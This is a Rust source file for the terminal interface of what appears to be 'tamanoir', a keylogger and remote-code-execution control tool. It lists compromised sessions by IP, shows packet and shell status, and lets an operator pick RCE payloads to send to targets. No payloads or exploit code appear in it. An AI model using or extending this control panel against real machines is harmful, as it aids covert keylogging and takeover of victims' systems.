use ratatui::{
    layout::{
        Constraint::{Fill, Length, Min},
        Direction, Layout, Margin, Rect,
    },
    style::{Color, Modifier, Style, Stylize},
    text::{Line, Span},
    widgets::{
        Block, BorderType, Cell, HighlightSpacing, Row, ScrollbarState, Table, TableState, Tabs,
    },
    Frame,
};
use tamanoir_common::{Layout as KeyboardLayout, TargetArch};

use super::shell::{SessionShellSection, ShellCommandHistoryMap};
use crate::{
    app::{AppResult, SessionsMap},
    grpc::{RceServiceClient, SessionServiceClient},
    notification::NotificationSender,
    tamanoir_grpc::{SessionRcePayload, SessionResponse},
};

#[derive(Debug)]
pub struct SessionSection {
    sessions_map: SessionsMap,
    state: TableState,
    scroll_state: ScrollbarState,
    pub selected_session: Option<SessionResponse>,
    pub edition_mode: bool,
    edit_section: SessionEditSection,
    pub shell: SessionShellSection,
    notification_sender: NotificationSender,
}

fn compute_payload_tx_pct(total_len: u32, remaining_len: u32) -> u8 {
    ((total_len.saturating_sub(remaining_len) as f32 / total_len as f32) * 100f32).min(100f32) as u8
}

impl SessionSection {
    pub async fn new(
        sessions_map: SessionsMap,
        shell_history_map: ShellCommandHistoryMap,
        session_client: &mut SessionServiceClient,
        rce_client: &mut RceServiceClient,
        notification_sender: NotificationSender,
    ) -> AppResult<Self> {
        for s in session_client.list_sessions().await? {
            sessions_map.write().unwrap().insert(s.ip.clone(), s);
        }
        let selected_session = sessions_map.read().unwrap().values().nth(0).cloned();
        let available_rce_payloads = Some(rce_client.list_available_rce().await?);
        let edit_section = SessionEditSection::new(available_rce_payloads);
        let shell = SessionShellSection::new(shell_history_map);
        Ok(Self {
            sessions_map,
            state: TableState::default().with_selected(0),
            scroll_state: ScrollbarState::new(0),
            selected_session,
            edition_mode: false,
            edit_section,
            shell,
            notification_sender,
        })
    }

    pub fn is_editing(&self) -> bool {
        self.selected_session.is_some() && self.edition_mode
    }

    pub async fn apply_change(
        &mut self,
        session_client: &mut SessionServiceClient,
        rce_client: &mut RceServiceClient,
    ) -> AppResult<()> {
        if self.edition_mode {
            let selected = self.edit_section.state().selected().unwrap();

            match self.edit_section.editing_section {
                EditSubsection::KeyboardLayout => {
                    let selected = self.edit_section.available_layouts[selected];
                    session_client
                        .update_session_layout(self.selected_session.clone().unwrap().ip, selected)
                        .await?;
                    self.notification_sender
                        .info(format!("Layout set to {selected}"))?;
                }
                EditSubsection::RcePayload => {
                    if let Some(avail_payloads) = &self.edit_section.available_rce_payloads {
                        let selected = &avail_payloads[selected];
                        if selected.name != "-" {
                            if rce_client
                                .set_session_rce(
                                    self.selected_session.clone().unwrap().ip,
                                    selected.name.clone(),
                                    selected.target_arch.clone(),
                                )
                                .await
                                .is_ok()
                            {
                                self.notification_sender
                                    .info(format!("Rce set to {}", selected.name))?;
                            }
                        } else if rce_client
                            .delete_session_rce(self.selected_session.clone().unwrap().ip)
                            .await
                            .is_ok()
                        {
                            self.notification_sender.info("Rce deleted".to_string())?;
                        }
                    }
                }
            }
        };
        Ok(())
    }

    pub fn next_item(&mut self) {
        if self.edition_mode {
            self.edit_section.scroll_down()
        } else {
            self.scroll_down()
        }
    }
    pub fn previous_item(&mut self) {
        if self.edition_mode {
            self.edit_section.scroll_up()
        } else {
            self.scroll_up()
        }
    }
    pub fn next_edit_section(&mut self) {
        if self.edition_mode {
            self.edit_section.next_edit_section()
        }
    }
    pub fn previous_edit_section(&mut self) {
        if self.edition_mode {
            self.edit_section.previous_edit_section()
        }
    }
    pub fn scroll_down(&mut self) {
        let i = match self.state.selected() {
            Some(i) => {
                if i >= self.sessions_map.read().unwrap().len() - 1 {
                    0
                } else {
                    i + 1
                }
            }
            None => 0,
        };
        self.state.select(Some(i));
        self.scroll_state = self.scroll_state.position(i);
        self.selected_session =
            if let Some((_, v)) = self.sessions_map.read().unwrap().iter().nth(i) {
                Some(v.clone())
            } else {
                None
            };
    }

    pub fn scroll_up(&mut self) {
        let i = match self.state.selected() {
            Some(i) => {
                if i == 0 {
                    self.sessions_map.read().unwrap().len() - 1
                } else {
                    i - 1
                }
            }
            None => 0,
        };
        self.state.select(Some(i));
        self.scroll_state = self.scroll_state.position(i);
        self.selected_session = self.sessions_map.read().unwrap().values().nth(i).cloned();
    }
    pub fn unselect(&mut self) {
        self.state.select(None);
        self.scroll_state = self
            .scroll_state
            .position(self.sessions_map.read().unwrap().len());
    }
    pub fn render_session_edition(&mut self, frame: &mut Frame, block: Rect) {
        let vertical = Layout::vertical([Length(1), Min(0)]);
        let [header_area, inner_area] = vertical.areas(block);

        let selected_row_style = Style::default()
            .add_modifier(Modifier::REVERSED)
            .fg(Color::LightBlue);
        let table = match self.edit_section.editing_section {
            EditSubsection::KeyboardLayout => {
                let header = Row::new([Span::from("Keyboard Layout").bold()]);
                let rows: Vec<Row> = self
                    .edit_section
                    .available_layouts
                    .clone()
                    .into_iter()
                    .map(|l| Row::new([Span::from(format!("{l}"))]))
                    .collect();
                Table::new(rows, [Fill(1)]).header(header)
            }
            EditSubsection::RcePayload => {
                let header =
                    Row::new([Span::from("Name").bold(), Span::from("Target Arch").bold()]);

                let rows: Vec<Row> = match &self.edit_section.available_rce_payloads {
                    Some(payloads) => payloads
                        .iter()
                        .map(|p| {
                            Row::new([
                                Span::from(p.name.clone()),
                                Span::from(p.target_arch.clone()),
                            ])
                        })
                        .collect(),
                    None => vec![],
                };
                Table::new(rows, [Fill(1), Fill(1)]).header(header)
            }
        };

        let tabs = Tabs::new(["RCE Payload", "KeyLogger"])
            .highlight_style(Style::default().fg(Color::Yellow).bold())
            .select(self.edit_section.editing_section.clone() as usize)
            .padding(" ", " ")
            .divider("|");
        frame.render_widget(
            Block::bordered()
                .border_type(BorderType::Rounded)
                .border_style(Style::new().fg(Color::Blue))
                .title(
                    Line::from(Span::styled(
                        format!(
                            "Edit Session ({})",
                            self.selected_session.as_ref().unwrap().ip,
                        ),
                        Style::default().fg(Color::Blue).bold(),
                    ))
                    .right_aligned(),
                ),
            block,
        );
        frame.render_widget(tabs, header_area);
        frame.render_stateful_widget(
            table.row_highlight_style(selected_row_style),
            inner_area.inner(Margin {
                vertical: 2,
                horizontal: 2,
            }),
            self.edit_section.state(),
        );
    }
    fn render_session_info(&self, frame: &mut Frame, block: Rect) {
        if let Some(s) = &self.selected_session {
            let (stats, rce) = {
                let chunks = Layout::default()
                    .direction(Direction::Horizontal)
                    .constraints([Fill(1), Fill(1)])
                    .flex(ratatui::layout::Flex::SpaceBetween)
                    .split(block);
                (chunks[0], chunks[1])
            };
            let cells_stats = vec![
                Cell::from(Span::from("Received Packets:").bold()),
                Cell::from(Span::from(s.n_packets.to_string())),
                Cell::from(Span::from("First Packet:").bold()),
                Cell::from(Span::from(s.first_packet.clone())),
                Cell::from(Span::from("Latest Packet:").bold()),
                Cell::from(Span::from(s.latest_packet.clone())),
                Cell::from(Span::from("Arch:").bold()),
                Cell::from(Span::from(
                    TargetArch::try_from(s.arch as u8)
                        .unwrap_or(TargetArch::Unknown)
                        .to_string(),
                )),
                Cell::from(Span::from("Shell Status:").bold()),
                Cell::from(Span::from(format!("{}", s.get_shell_status()))),
            ];
            let rows_stats: Vec<Row> = cells_stats
                .chunks(2)
                .map(|r| Row::new(r.to_vec()))
                .collect();
            let table_stats: Table<'_> = Table::new(rows_stats, [Fill(1), Fill(1)]).block(
                Block::bordered()
                    .border_type(BorderType::Rounded)
                    .border_style(Style::new().fg(Color::Blue))
                    .title(Span::styled(
                        "Session Info",
                        Style::default().fg(Color::Blue).bold(),
                    )),
            );

            let rce_info: (String, String, String, String) = match &s.rce_payload {
                None => ("".into(), "".into(), "".into(), "".into()),
                Some(rce) => (
                    rce.name.clone(),
                    format!("{} bytes", rce.length),
                    rce.target_arch.clone(),
                    format!(
                        "{} %",
                        compute_payload_tx_pct(rce.length, rce.buffer_length)
                    ),
                ),
            };
            let cells_rce = vec![
                Cell::from(Span::from("Selected Payload:").bold()),
                Cell::from(Span::from(rce_info.0)),
                Cell::from(Span::from("Size:").bold()),
                Cell::from(Span::from(rce_info.1)),
                Cell::from(Span::from("Target Arch:").bold()),
                Cell::from(Span::from(rce_info.2)),
                Cell::from(Span::from("Tx Status:").bold()),
                Cell::from(Span::from(rce_info.3)),
            ];
            let rows_rce: Vec<Row> = cells_rce.chunks(2).map(|r| Row::new(r.to_vec())).collect();
            let table_rce = Table::new(rows_rce, [Length(20), Fill(1)]).block(
                Block::bordered()
                    .border_type(BorderType::Rounded)
                    .border_style(Style::new().fg(Color::Blue))
                    .title(Span::styled(
                        "Payload Transmission",
                        Style::default().fg(Color::Blue).bold(),
                    )),
            );
            frame.render_widget(table_stats, stats);
            frame.render_widget(table_rce, rce);
        } else {
            let table: Table<'_> = Table::new(
                [Row::new([Cell::from("No session available")])
                    .style(Style::new().fg(Color::White))],
                [Fill(1)],
            )
            .block(
                Block::bordered()
                    .border_type(BorderType::Rounded)
                    .border_style(Style::new().fg(Color::Blue))
                    .title(Span::styled(
                        "Session Info",
                        Style::default().fg(Color::Blue).bold(),
                    )),
            );

            frame.render_widget(table, block);
        }
    }

    fn sync_selected_session(&mut self) {
        //called every app tick, to sync selected session with its value in SessionStore
        self.selected_session = match &self.selected_session {
            Some(session) => self.sessions_map.read().unwrap().get(&session.ip).cloned(),
            None => None,
        }
    }
    pub fn render(&mut self, frame: &mut Frame, block: Rect, is_focused: bool) {
        self.sync_selected_session();
        let (session_selection, session_info) = {
            let chunks = Layout::default()
                .direction(Direction::Horizontal)
                .constraints([Length(18), Fill(1)])
                .flex(ratatui::layout::Flex::SpaceBetween)
                .split(block);
            (chunks[0], chunks[1])
        };
        let selected_row_style = Style::default()
            .add_modifier(Modifier::REVERSED)
            .fg(Color::LightBlue);

        let rows: Vec<Row> = {
            let reader = self.sessions_map.read().unwrap();
            reader.keys().map(|k| {
                    Row::new([Cell::from(k.clone())]).style(Style::new().fg(Color::White))
                })
                .collect()
        };

        let highlight_color = if is_focused && !self.edition_mode {
            Color::Yellow
        } else {
            Color::Blue
        };
        let table: Table<'_> = Table::new(rows, [Fill(1)])
            .row_highlight_style(selected_row_style)
            .highlight_spacing(HighlightSpacing::Never)
            .block(
                Block::bordered()
                    .border_type(BorderType::Rounded)
                    .border_style(Style::new().fg(highlight_color))
                    .title(Span::styled(
                        "Current Sessions",
                        Style::default().fg(highlight_color).bold(),
                    )),
            );

        frame.render_stateful_widget(table, session_selection, &mut self.state);
        self.render_session_info(frame, session_info);
    }
}
#[derive(Debug)]
struct SessionEditSection {
    editing_section: EditSubsection,

    available_layouts: Vec<KeyboardLayout>,
    layout_table_state: TableState,
    layout_scroll_state: ScrollbarState,

    available_rce_payloads: Option<Vec<SessionRcePayload>>,
    rce_table_state: TableState,
    rce_scroll_state: ScrollbarState,
}
#[derive(Debug, Clone)]
enum EditSubsection {
    RcePayload = 0,
    KeyboardLayout = 1,
}

impl SessionEditSection {
    pub fn new(available_rce_payloads: Option<Vec<SessionRcePayload>>) -> Self {
        let available_layouts = KeyboardLayout::ALL;
        let available_rce_payloads = available_rce_payloads.map(|mut avail_payloads| {
            avail_payloads.extend_from_slice(&[SessionRcePayload {
                name: "-".into(),
                target_arch: "(will reset any payload transmission)".into(),
                length: 0,
                buffer_length: 0,
            }]);
            avail_payloads
        });
        Self {
            editing_section: EditSubsection::RcePayload,

            available_layouts: available_layouts.to_vec(),
            layout_table_state: TableState::default().with_selected(0),
            layout_scroll_state: ScrollbarState::new(0),

            available_rce_payloads,
            rce_table_state: TableState::default().with_selected(0),
            rce_scroll_state: ScrollbarState::new(0),
        }
    }
    fn state(&mut self) -> &mut TableState {
        match self.editing_section {
            EditSubsection::KeyboardLayout => &mut self.layout_table_state,
            EditSubsection::RcePayload => &mut self.rce_table_state,
        }
    }
    fn scroll_state(&mut self) -> &mut ScrollbarState {
        match self.editing_section {
            EditSubsection::KeyboardLayout => &mut self.layout_scroll_state,
            EditSubsection::RcePayload => &mut self.rce_scroll_state,
        }
    }

    fn n_options(&self) -> usize {
        match self.editing_section {
            EditSubsection::KeyboardLayout => self.available_layouts.len(),
            EditSubsection::RcePayload => {
                if let Some(payloads_list) = &self.available_rce_payloads {
                    payloads_list.len()
                } else {
                    0
                }
            }
        }
    }
    fn next_edit_section(&mut self) {
        self.editing_section = match self.editing_section {
            EditSubsection::KeyboardLayout => EditSubsection::RcePayload,
            EditSubsection::RcePayload => EditSubsection::KeyboardLayout,
        }
    }
    fn previous_edit_section(&mut self) {
        self.next_edit_section()
    }
    pub fn scroll_down(&mut self) {
        let n_options = self.n_options();
        let state = self.state();
        let i = match state.selected() {
            Some(i) => {
                if i < n_options - 1 {
                    i + 1
                } else {
                    i
                }
            }
            None => 0,
        };

        state.select(Some(i));
        let scroll_state = self.scroll_state();
        *scroll_state = scroll_state.position(i);
    }
    pub fn scroll_up(&mut self) {
        let state = self.state();
        let i = match state.selected() {
            Some(i) => {
                i.saturating_sub(1)
            }
            None => 0,
        };

        state.select(Some(i));
        let scroll_state = self.scroll_state();
        *scroll_state = scroll_state.position(i);
    }
}
